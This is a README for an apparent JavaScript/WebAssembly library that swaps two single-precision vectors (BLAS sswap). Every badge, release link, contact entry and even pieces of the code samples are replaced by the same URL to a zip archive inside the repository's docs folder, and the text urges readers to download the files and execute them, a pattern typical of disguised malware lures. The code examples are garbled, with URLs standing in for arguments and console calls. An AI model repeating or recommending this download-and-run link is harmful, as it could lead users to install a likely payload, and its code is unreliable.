# 🧮 BLAS Base WASM SSwap

![GitHub Workflow Status](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)
![GitHub License](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)
![Version](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)

Interchange two single-precision floating-point vectors with ease using this efficient and straightforward implementation of the SSwap subroutine. 

## Table of Contents

- [Introduction](#introduction)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Performance](#performance)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

The BLAS Base WASM SSwap library is designed for developers who need to swap two vectors of single-precision floating-point numbers. This library leverages WebAssembly for speed and efficiency, making it suitable for high-performance applications in web environments.

The main operation is simple: given two vectors, this library will interchange their elements. This operation is fundamental in various mathematical and computational tasks, particularly in linear algebra.

You can find the latest releases [here](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip). Download the necessary files and execute them to get started.

## Installation

To install the library, you can use npm. Run the following command in your project directory:

```bash
npm install blas-base-wasm-sswap
```

This command will add the library to your project, making it available for use in your JavaScript code.

## Usage

Once you have installed the library, you can import it into your JavaScript project. Here’s a basic example of how to use the SSwap function:

```javascript
import { sswap } from 'blas-base-wasm-sswap';

// Define two vectors
const vectorA = new Float32Array([1.0, 2.0, 3.0]);
const vectorB = new Float32Array([4.0, 5.0, 6.0]);

// Swap the vectors
sswap(https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip, vectorA, 1, vectorB, 1);

// Output the swapped vectors
https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip('Vector A:', vectorA); // [4.0, 5.0, 6.0]
https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip('Vector B:', vectorB); // [1.0, 2.0, 3.0]
```

### Function Signature

The `sswap` function has the following signature:

```javascript
sswap(n, x, incx, y, incy);
```

- `n`: Number of elements in each vector.
- `x`: First vector (Float32Array).
- `incx`: Increment for the first vector.
- `y`: Second vector (Float32Array).
- `incy`: Increment for the second vector.

### Important Notes

- Ensure that both vectors are of the same length.
- The increments (`incx` and `incy`) determine how many positions to skip in the vectors. A value of `1` means no skipping.

## Examples

### Example 1: Basic Swap

Here’s a simple example demonstrating the swap of two vectors:

```javascript
const a = new Float32Array([10, 20, 30]);
const b = new Float32Array([40, 50, 60]);

sswap(https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip, a, 1, b, 1);

https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(a); // [40, 50, 60]
https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(b); // [10, 20, 30]
```

### Example 2: Using Different Increments

You can also use different increments for more complex operations:

```javascript
const a = new Float32Array([1, 2, 3, 4]);
const b = new Float32Array([5, 6, 7, 8]);

sswap(2, a, 2, b, 1);

https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(a); // [1, 6, 3, 8]
https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip(b); // [5, 2, 7, 4]
```

In this example, the first element of `a` is swapped with the first element of `b`, while the second element of `a` is skipped.

## Performance

The SSwap function is optimized for performance, especially when used in a WebAssembly context. The use of WebAssembly allows for near-native execution speed, making it suitable for applications requiring high performance.

### Benchmarking

We encourage users to benchmark the performance of the SSwap function in their specific use cases. You can use libraries like https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip to compare it against other implementations.

## Contributing

We welcome contributions to improve the library. If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your fork.
5. Create a pull request.

Please ensure that your code adheres to the existing style and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any questions or feedback, feel free to reach out:

- GitHub: [yarikkyzym](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip)
- Email: https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip

For more information and updates, check the [Releases](https://github.com/yarikkyzym/blas-base-wasm-sswap/raw/refs/heads/main/docs/types/wasm-base-sswap-blas-v3.6.zip) section.

Thank you for using BLAS Base WASM SSwap! Happy coding!